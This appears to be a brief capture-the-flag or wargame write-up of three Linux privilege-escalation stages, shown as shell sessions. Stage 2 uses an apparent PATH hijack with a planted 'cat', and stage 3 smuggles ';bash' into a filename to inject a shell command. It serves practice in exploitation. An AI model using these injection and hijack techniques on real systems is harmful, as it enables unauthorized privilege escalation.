
## Stage 1

```bash
iuser@eabdf37ef1a9:/home/stage1$ ./stage1
user@eabdf37ef1a9:/home/stage1$ id
uid=1000(user) gid=1501(stage1) groups=1501(stage1),1000(user)
```

## Stage 2 

```bash
user@eabdf37ef1a9:/home/stage2$ chmod a+x /tmp/mytmp/cat
user@eabdf37ef1a9:/home/stage2$ ./stage2
uid=1000(user) gid=1502(stage2) groups=1502(stage2),1000(user)
user@eabdf37ef1a9:/home/stage2$

```

## Stage 3 

```bash 
user@eabdf37ef1a9:/home/stage3$ touch "/tmp/mytmp/test\r\n;bash"
user@eabdf37ef1a9:/home/stage3$ ./stage3
Please enter the filename you want to access: /tmp/mytmp/test\r\n;bash
/tmp/mytmp/testrn: empty
user@eabdf37ef1a9:/home/stage3$ id
uid=1000(user) gid=1503(stage3) groups=1503(stage3),1000(user)
user@eabdf37ef1a9:/home/stage3$
```


